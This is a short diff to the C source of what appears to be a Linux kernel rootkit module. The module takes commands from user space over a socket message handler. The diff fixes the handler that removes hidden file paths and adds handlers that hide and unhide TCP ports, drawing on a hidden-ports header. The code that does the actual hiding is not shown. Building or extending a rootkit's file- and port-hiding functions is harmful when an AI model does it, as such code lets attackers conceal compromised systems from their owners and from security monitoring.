@@ -5,6 +5,7 @@
 #include "../msg_to_user.h"
 
 #include "hidden_files_trie.h"
+#include "hidden_tcp_ports.h"
 
 extern void exit_my_module(void);
 
@@ -40,8 +41,23 @@ void my_recv_msg(struct sk_buff *skb) {
             break;
         }
         case OPER_REMOVE_HIDDEN_PATH: {
+            remove_word(trie, msg.data);
             printk(KERN_INFO
             "remove hidden path: %s\n", msg.data);
+            break;
+        }
+        case OPER_ADD_HIDDEN_TCP_PORT: {
+            PORT port = *((PORT*) msg.data);
+            add_hidden_tcp_port(port);
+            printk(KERN_INFO
+            "add hidden port: %d\n", port);
+            break;
+        }
+        case OPER_REMOVE_HIDDEN_TCP_PORT: {
+            PORT port = *((PORT*) msg.data);
+            remove_hidden_tcp_port(port);
+            printk(KERN_INFO
+            "remove hidden port: %d\n", port);
             break;
         }
     }
